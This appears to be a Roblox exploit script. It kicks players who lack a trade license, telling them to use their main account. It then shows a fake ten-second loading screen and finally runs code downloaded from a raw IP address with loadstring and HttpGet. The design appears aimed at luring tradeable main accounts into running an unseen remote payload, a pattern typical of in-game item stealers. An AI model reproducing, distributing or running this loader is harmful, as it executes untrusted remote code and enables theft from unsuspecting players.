-- ===== TRADE LICENSE CHECK =====
local Players = game:GetService("Players")
local plr = Players.LocalPlayer

-- Safely require the trade license module
local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)

if not tradeLicense.player_has_trade_license() then
    plr:Kick("This script dont supports an alt account. Please use your main account to prevent errors.")
    return
end

-- ===== LOADING SCREEN =====
local LoadingGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UIStroke = Instance.new("UIStroke")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local ProgressBar = Instance.new("Frame")
local ProgressFill = Instance.new("Frame")
local ProgressText = Instance.new("TextLabel")

LoadingGui.Name = "LoadingGui"
LoadingGui.Parent = game.CoreGui
LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Main Frame
Frame.Parent = LoadingGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 350, 0, 150)
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)

UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = Frame

UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Thickness = 2
UIStroke.Parent = Frame

-- Title
Title.Parent = Frame
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Position = UDim2.new(0, 0, 0, 10)
Title.BackgroundTransparency = 1
Title.Text = "Loading Script..."
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold

-- Progress Bar
ProgressBar.Parent = Frame
ProgressBar.Size = UDim2.new(0.9, 0, 0, 20)
ProgressBar.Position = UDim2.new(0.05, 0, 0.55, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressBar.BorderSizePixel = 0
UICorner:Clone().Parent = ProgressBar

ProgressFill.Parent = ProgressBar
ProgressFill.Size = UDim2.new(0, 0, 1, 0)
ProgressFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
ProgressFill.BorderSizePixel = 0
UICorner:Clone().Parent = ProgressFill

-- Progress Text
ProgressText.Parent = Frame
ProgressText.Size = UDim2.new(1, 0, 0, 30)
ProgressText.Position = UDim2.new(0, 0, 0.75, 0)
ProgressText.BackgroundTransparency = 1
ProgressText.Text = "0%"
ProgressText.TextColor3 = Color3.fromRGB(255, 255, 255)
ProgressText.TextScaled = true
ProgressText.Font = Enum.Font.Gotham

-- Animate Loading (10s total)
for i = 1, 100 do
    ProgressFill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.05, true)
    ProgressText.Text = i .. "%"
    task.wait(0.1) -- ~10 seconds
end

-- Remove loading screen fully
LoadingGui:Destroy()

-- ===== YOUR EXTERNAL SCRIPT LOADER =====
print("‚úÖ Loading external script...")

local success, err = pcall(function()
    -- üëá Your actual script line goes right here:
    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
end)

if success then
    print("‚úÖ External script loaded successfully!")
else
    warn("‚ùå Failed to load external script: " .. tostring(err))
end
